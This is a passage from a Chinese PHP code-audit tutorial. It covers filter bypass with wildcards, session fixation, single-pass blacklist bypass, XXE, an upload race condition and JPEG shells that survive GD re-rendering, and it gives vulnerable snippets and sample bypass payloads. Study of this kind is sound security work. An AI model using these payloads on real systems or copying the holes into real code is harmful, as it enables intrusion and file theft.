file_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof
file_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音
复制代码
```

### Linux 通配符利用

原理：linux下，\*代表任意字符(0到多个)，?代表一个字符，所以如果是有执行linux系统命令，那就可以用这些通配符来绕过过滤，并执行我们想要的命令

```php
<?php
## 本地flag路径为 /data/sublime/php/audit/3/flag.txt
## ?filename='/????/???????/???/?????/?/*'
function waf($file){
    return preg_replace('/[a-z0-9.]/i', '', "$file");
}
$filename = $_GET['file'];
$file = waf($filename);
echo $file;
system('less '.$file);
复制代码
```

### 处理value没有处理key

foreach时,addslashes对获得的value值进行处理，但没有处理key。

### 用来目录遍历的特别函数

[wooyun.webbaozi.com/bug\_detail.…](http://wooyun.webbaozi.com/bug\_detail.php?wybug\_id=wooyun-2014-088094)

lstat 函数

[wooyun.webbaozi.com/bug\_detail.…](http://wooyun.webbaozi.com/bug\_detail.php?wybug\_id=wooyun-2014-088071) stream\_resolve\_include\_path函数

[wooyun.webbaozi.com/bug\_detail.…](http://wooyun.webbaozi.com/bug\_detail.php?wybug\_id=wooyun-2014-083688)

[wooyun.webbaozi.com/bug\_detail.…](http://wooyun.webbaozi.com/bug\_detail.php?wybug\_id=wooyun-2014-083457)

[wooyun.webbaozi.com/bug\_detail.…](http://wooyun.webbaozi.com/bug\_detail.php?wybug\_id=wooyun-2014-083453)

### 绕过GD库图片渲染

jpg\_payload.zip

jpg\_name.jpg是待GD处理的图片

```
php jpg_payload.php <jpg_name.jpg>
复制代码
```

生成好的图片，在经过如下代码处理后，依然能保留其中的shell：

```php
<?php
    imagecreatefromjpeg('xxxx.jpg');
?>
复制代码
```

### 会话固定

```php
if(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid
复制代码
```

通过get方法来设置session。所以可以通过CSRF：

http://xxxx/index.php?r=admin/index/index\&phpsessid=f4cking123

管理员点了我们就能使用此session进后台了。

### 黑名单绕过

原理：通过黑名单将敏感字符替换为空，然而只按顺序执行一次。可通过故意过滤构造payload.

```php
## %*27
## 经典如phpcms9.6.0注入,过滤后去掉了*，剩下的%27即可使用。
function safe_replace($string) {
    $string = str_replace('%20','',$string);
    $string = str_replace('%27','',$string);
    $string = str_replace('%2527','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace('"','&quot;',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('<','&lt;',$string);
    $string = str_replace('>','&gt;',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    $string = str_replace('\\','',$string);
    return $string;
}
复制代码
```

### XXE注入

原理：simplexml\_load\_file函数的参数过滤不严，导致引入外部实体。产生任意文件读取。

### 文件上传条件竞争

原理：

后台逻辑：将上传的文件上传到Web目录，然后检查文件的安全性，如果发现文件不安全就马上通过unlink()将其删除。 利用方法：在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell。这时候shell已经生成，文件被删除就无所谓了。

```php
<?php
  if($_FILES["file"]["error"] > 0)){
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $_FILES["file"]["name"]);
    //check file
    unlink("upload/"._FILES["file"]["name"]));
 }
?>
复制代码
```

### 资料

[github.com/bowu678/php…](https://github.com/bowu678/php\_bugs)

[github.com/jiangsir404…](https://github.com/jiangsir404/Audit-Learning)

[read.douban.com/reader/eboo…](https://read.douban.com/reader/ebook/16642056/)

[github.com/SecWiki/CMS…](https://github.com/SecWiki/CMS-Hunter)

[github.com/CHYbeta/Cod…](https://github.com/CHYbeta/Code-Audit-Challenges)

作者：木禾ali0th 链接：https://juejin.cn/post/6844903829725511693 来源：掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
